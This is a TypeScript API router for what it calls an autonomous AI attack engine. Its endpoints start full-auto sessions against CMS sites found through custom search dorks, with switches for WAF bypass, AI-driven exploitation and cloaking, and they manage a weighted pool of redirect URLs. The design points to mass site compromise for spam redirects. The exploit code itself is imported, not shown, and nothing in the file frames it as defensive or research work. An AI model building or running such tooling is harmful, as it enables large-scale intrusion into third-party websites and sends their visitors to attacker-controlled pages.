/**
 * Agentic Attack Router — tRPC endpoints for autonomous AI attack engine
 * + Redirect URL pool management
 */
import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import {
  startAgenticSession,
  stopAgenticSession,
  getAgenticSessionStatus,
  listAgenticSessions,
  getActiveSessionCount,
  // Redirect URL management
  addRedirectUrl,
  removeRedirectUrl,
  listRedirectUrls,
  updateRedirectUrl,
  seedDefaultRedirectUrl,
} from "../agentic-attack-engine";

export const agenticAttackRouter = router({
  // ═══════════════════════════════════════════════
  // AGENTIC SESSION MANAGEMENT
  // ═══════════════════════════════════════════════
  
  /** Start a new agentic attack session */
  startSession: protectedProcedure
    .input(z.object({
      mode: z.enum(["full_auto", "semi_auto", "discovery_only"]).default("full_auto"),
      redirectUrls: z.array(z.string().url()).optional(),
      targetCms: z.array(z.string()).optional(),
      maxTargetsPerRun: z.number().min(1).max(500).default(50),
      maxConcurrent: z.number().min(1).max(10).default(3),
      seoKeywords: z.array(z.string()).optional(),
      customDorks: z.array(z.string()).optional(),
      enableWafBypass: z.boolean().default(true),
      enableAiExploit: z.boolean().default(true),
      enableCloaking: z.boolean().default(false),
    }))
    .mutation(async ({ ctx, input }) => {
      return startAgenticSession({
        userId: ctx.user.id,
        mode: input.mode,
        redirectUrls: input.redirectUrls,
        targetCms: input.targetCms,
        maxTargetsPerRun: input.maxTargetsPerRun,
        maxConcurrent: input.maxConcurrent,
        seoKeywords: input.seoKeywords,
        customDorks: input.customDorks,
        enableWafBypass: input.enableWafBypass,
        enableAiExploit: input.enableAiExploit,
        enableCloaking: input.enableCloaking,
      });
    }),
  
  /** Stop a running agentic session */
  stopSession: protectedProcedure
    .input(z.object({ sessionId: z.number() }))
    .mutation(async ({ input }) => {
      return stopAgenticSession(input.sessionId);
    }),
  
  /** Get status of a specific agentic session */
  getSessionStatus: protectedProcedure
    .input(z.object({ sessionId: z.number() }))
    .query(async ({ input }) => {
      return getAgenticSessionStatus(input.sessionId);
    }),
  
  /** List all agentic sessions for the current user */
  listSessions: protectedProcedure
    .input(z.object({
      page: z.number().min(1).default(1),
      limit: z.number().min(1).max(100).default(20),
    }).optional())
    .query(async ({ ctx, input }) => {
      return listAgenticSessions(ctx.user.id, input?.page || 1, input?.limit || 20);
    }),
  
  /** Get count of active sessions */
  activeCount: protectedProcedure
    .query(async () => {
      return { count: getActiveSessionCount() };
    }),
  
  // ═══════════════════════════════════════════════
  // REDIRECT URL POOL MANAGEMENT
  // ═══════════════════════════════════════════════
  
  /** List all redirect URLs in the pool */
  listRedirects: protectedProcedure
    .query(async () => {
      return listRedirectUrls();
    }),
  
  /** Add a new redirect URL to the pool */
  addRedirect: protectedProcedure
    .input(z.object({
      url: z.string().url(),
      label: z.string().optional(),
      weight: z.number().min(1).max(100).default(1),
      isDefault: z.boolean().default(false),
    }))
    .mutation(async ({ input }) => {
      return addRedirectUrl(input.url, input.label, input.weight, input.isDefault);
    }),
  
  /** Remove a redirect URL from the pool */
  removeRedirect: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ input }) => {
      return removeRedirectUrl(input.id);
    }),
  
  /** Update a redirect URL */
  updateRedirect: protectedProcedure
    .input(z.object({
      id: z.number(),
      url: z.string().url().optional(),
      label: z.string().optional(),
      weight: z.number().min(1).max(100).optional(),
      isActive: z.boolean().optional(),
      isDefault: z.boolean().optional(),
    }))
    .mutation(async ({ input }) => {
      const { id, ...updates } = input;
      return updateRedirectUrl(id, updates);
    }),
  
  /** Seed default redirect URL if none exists */
  seedDefaults: protectedProcedure
    .mutation(async () => {
      await seedDefaultRedirectUrl();
      return { success: true };
    }),
});
